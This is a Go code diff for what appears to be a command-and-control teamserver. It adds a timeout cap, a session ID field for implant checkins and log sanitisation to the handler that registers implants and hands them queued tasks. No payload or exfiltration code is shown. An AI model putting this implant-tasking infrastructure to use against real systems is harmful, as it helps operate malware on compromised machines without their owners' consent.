@@ -78,6 +78,9 @@ func main() {
 				return ids
 			},
 			func(sessionID string, taskType uint8, data []byte, timeout int) (interface{}, error) {
+				if timeout > 3600 {
+					timeout = 3600 // max 1 hour
+				}
 				return tm.Enqueue(sessionID, TaskType(taskType), data, time.Duration(timeout)*time.Second)
 			},
 		)
@@ -96,6 +99,9 @@ func main() {
 				return ids
 			},
 			func(sessionID string, taskType uint8, data []byte, timeout int) (interface{}, error) {
+				if timeout > 3600 {
+					timeout = 3600 // max 1 hour
+				}
 				return tm.Enqueue(sessionID, TaskType(taskType), data, time.Duration(timeout)*time.Second)
 			},
 		)
@@ -120,17 +126,21 @@ func handleImplantData(sm *SessionManager, tm *TaskManager, transport string, da
 		return nil, fmt.Errorf("empty data")
 	}
 
-	// Parse register message
+	// Parse message — register and checkin share fields
 	type registerMsg struct {
-		Op       string `json:"op"`
-		Pubkey   string `json:"pubkey"`
-		Hostname string `json:"hostname"`
-		OS       string `json:"os"`
+		Op        string `json:"op"`
+		Pubkey    string `json:"pubkey"`
+		Hostname  string `json:"hostname"`
+		OS        string `json:"os"`
+		SessionID string `json:"session_id"` // required for checkin
 	}
 	var reg registerMsg
 	if err := json.Unmarshal(data, &reg); err != nil {
 		return nil, fmt.Errorf("parse: %w", err)
 	}
+	// Sanitize user-controlled strings for log safety
+	reg.Hostname = sanitizeLogString(reg.Hostname)
+	reg.OS = sanitizeLogString(reg.OS)
 
 	switch reg.Op {
 	case "register":
@@ -151,14 +161,15 @@ func handleImplantData(sm *SessionManager, tm *TaskManager, transport string, da
 		return respBytes, nil
 
 	case "checkin":
-		// Implant is checking in — return any pending tasks
-		sessionID := reg.Hostname // hack: using hostname field for session ID
-		session := sm.Get(sessionID)
+		if reg.SessionID == "" {
+			return nil, fmt.Errorf("checkin requires session_id")
+		}
+		session := sm.Get(reg.SessionID)
 		if session == nil {
-			return nil, fmt.Errorf("unknown session: %s", sessionID)
+			return nil, fmt.Errorf("unknown session: %s", reg.SessionID)
 		}
 		session.Touch()
-		task := tm.Dequeue(sessionID)
+		task := tm.Dequeue(reg.SessionID)
 		if task == nil {
 			return []byte{}, nil // no tasks
 		}
@@ -171,6 +182,21 @@ func handleImplantData(sm *SessionManager, tm *TaskManager, transport string, da
 	default:
 		return nil, fmt.Errorf("unknown op: %s", reg.Op)
 	}
+}
+
+// sanitizeLogString strips non-printable characters and truncates to 256 bytes
+func sanitizeLogString(s string) string {
+	b := []byte(s)
+	out := make([]byte, 0, len(b))
+	for _, c := range b {
+		if c >= 32 && c < 127 {
+			out = append(out, c)
+		}
+	}
+	if len(out) > 256 {
+		out = out[:256]
+	}
+	return string(out)
 }
 
 func loadConfig(path string) (*TeamserverConfig, error) {
